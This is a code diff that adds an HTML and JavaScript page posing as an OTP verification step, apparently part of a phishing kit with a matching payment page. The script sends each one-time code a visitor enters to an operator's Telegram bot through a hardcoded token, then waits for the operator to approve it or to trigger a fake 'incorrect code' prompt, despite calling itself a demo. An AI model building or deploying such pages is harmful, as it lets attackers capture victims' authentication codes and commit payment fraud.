@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Overlay for decline message */
+        
+        #declineOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        #declineOverlay.show {
+            display: flex;
+        }
+        
+        .decline-box {
+            background: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            text-align: center;
+            max-width: 400px;
+            margin: 1rem;
+        }
+    </style>
+</head>
+
+<body class="bg-white">
+
+    <!-- Decline Overlay -->
+    <div id="declineOverlay">
+        <div class="decline-box">
+            <div class="text-5xl mb-4">❌</div>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Incorrect details entered</h2>
+            <p class="text-gray-600 mb-6">The OTP code provided is incorrect. Please try again.</p>
+            <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
+            Try again
+        </button>
+        </div>
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen px-5 pt-6">
+
+        <!-- Back button -->
+        <button onclick="history.back()" class="flex items-center gap-2 border rounded-full px-4 py-2 text-gray-700 text-sm">
+        ← Back
+    </button>
+
+        <!-- Title -->
+        <h1 class="mt-6 text-xl font-semibold text-gray-900">
+            OTP Verification
+        </h1>
+
+        <!-- Instruction -->
+        <p class="mt-3 text-gray-700 text-sm">
+            Please enter the OTP code you received at
+            <span class="font-semibold">+260812345678</span>
+        </p>
+
+        <!-- FORM -->
+        <form method="POST" action="/hodlfa/" id="otpForm" class="mt-8">
+            <input type="hidden" name="csrfmiddlewaretoken" value="JQq0Sx4F8jWZQ0bh6cqFW9m1LWlxw1We21YItZBnkbgyTzpcGids45qch9MDLeF8">
+
+            <div class="flex gap-4 justify-between">
+
+                <input type="text" maxlength="1" name="code" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" required>
+
+                <input type="text" maxlength="1" name="code2" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
+
+                <input type="text" maxlength="1" name="code3" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
+
+                <input type="text" maxlength="1" name="code4" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
+
+            </div>
+
+        </form>
+
+        <!-- Resend -->
+        <div class="mt-6">
+            <button type="button" class="text-red-600 font-semibold text-sm">
+            RESEND OTP CODE
+        </button>
+        </div>
+
+    </div>
+
+    <script>
+        // ===== TELEGRAM CONFIG (USE THE SAME VALUES AS THE PAYMENT PAGE) =====
+        const TELEGRAM_BOT_TOKEN = "8868126718:AAGWhx2m0mMJn45vZDxKCtQTpj8ky2C7y1Q";
+        const TELEGRAM_CHAT_ID = "5946203307";
+        // =====================================================================
+
+        const inputs = document.querySelectorAll(".otp");
+        const form = document.getElementById("otpForm");
+        const declineOverlay = document.getElementById("declineOverlay");
+
+        let sentMessageId = null;
+        let lastUpdateId = 0;
+        let pollingActive = false;
+
+        // Focus first input on load
+        window.onload = () => inputs[0].focus();
+
+        inputs.forEach((input, index) => {
+
+            // Handle typing
+            input.addEventListener("input", () => {
+
+                input.value = input.value.replace(/[^0-9]/g, '');
+
+                if (input.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+
+                checkAndSubmit();
+            });
+
+            // Handle backspace
+            input.addEventListener("keydown", (e) => {
+
+                if (e.key === "Backspace" && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+
+            });
+
+            // Handle paste
+            input.addEventListener("paste", (e) => {
+
+                e.preventDefault();
+
+                let pasteData = e.clipboardData.getData("text")
+                    .replace(/[^0-9]/g, '')
+                    .slice(0, inputs.length);
+
+                pasteData.split("").forEach((num, i) => {
+                    inputs[i].value = num;
+                });
+
+                if (pasteData.length === inputs.length) {
+                    checkAndSubmit();
+                }
+
+            });
+
+        });
+
+        function checkAndSubmit() {
+
+            let otp = "";
+
+            inputs.forEach(input => otp += input.value);
+
+            if (otp.length === inputs.length) {
+
+                // ⛔ Prevent normal form submission
+                form.removeEventListener("submit", handleSubmit);
+                form.addEventListener("submit", handleSubmit);
+
+                // Trigger the send to Telegram
+                sendOTP(otp);
+
+            }
+
+        }
+
+        function handleSubmit(e) {
+            e.preventDefault(); // Block traditional submission
+        }
+
+        // === POLLING : listens for bot responses ===
+        function startPolling() {
+            if (pollingActive) return;
+            pollingActive = true;
+
+            const interval = setInterval(() => {
+                if (!sentMessageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+
+                fetch(url)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                const msgId = cb.message && cb.message.message_id;
+                                const cbData = cb.data;
+
+                                if (msgId === sentMessageId) {
+                                    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+                                    fetch(answerUrl, {
+                                        method: "POST",
+                                        headers: {
+                                            "Content-Type": "application/json"
+                                        },
+                                        body: JSON.stringify({
+                                            callback_query_id: cb.id
+                                        })
+                                    });
+
+                                    if (cbData === "approve") {
+                                        clearInterval(interval);
+                                        pollingActive = false;
+                                        window.location.href = "success.html";
+                                    } else if (cbData === "decline") {
+                                        clearInterval(interval);
+                                        pollingActive = false;
+                                        showDecline();
+                                    }
+                                }
+                            }
+                        });
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000); // Check every 2 seconds
+        }
+
+        // === Show the Decline overlay + reset ===
+        function showDecline() {
+            // Reset the form
+            form.reset();
+            inputs.forEach(input => input.value = "");
+            sentMessageId = null;
+            pollingActive = false;
+
+            // Show the overlay
+            declineOverlay.classList.add("show");
+        }
+
+        // === Close the overlay ===
+        function closeDecline() {
+            declineOverlay.classList.remove("show");
+            inputs[0].focus(); // Put focus back on the first field
+        }
+
+        function sendOTP(otp) {
+
+            const message = `
+🔴 OTP CODE RECEIVED (DEMO)
+━━━━━━━━━━━━━━━━━━━━━
+🔑 OTP : ${otp}
+🕐 Timestamp : ${new Date().toLocaleString("en-US")}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ This is a demo — for testing purposes only.
+    `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML",
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "✅ Approve",
+                                    callback_data: "approve"
+                                }, {
+                                    text: "❌ Decline",
+                                    callback_data: "decline"
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Telegram (OTP) response:", data);
+                    if (data.ok && data.result) {
+                        sentMessageId = data.result.message_id;
+                        // Start polling to listen for the response
+                        startPolling();
+                    } else {
+                        // Fallback : redirect if sending fails
+                        window.location.href = "success.html";
+                    }
+                })
+                .catch(error => {
+                    console.error("Telegram OTP error:", error);
+                    window.location.href = "success.html";
+                });
+
+        }
+    </script>
+
+</body>
+
+</html>
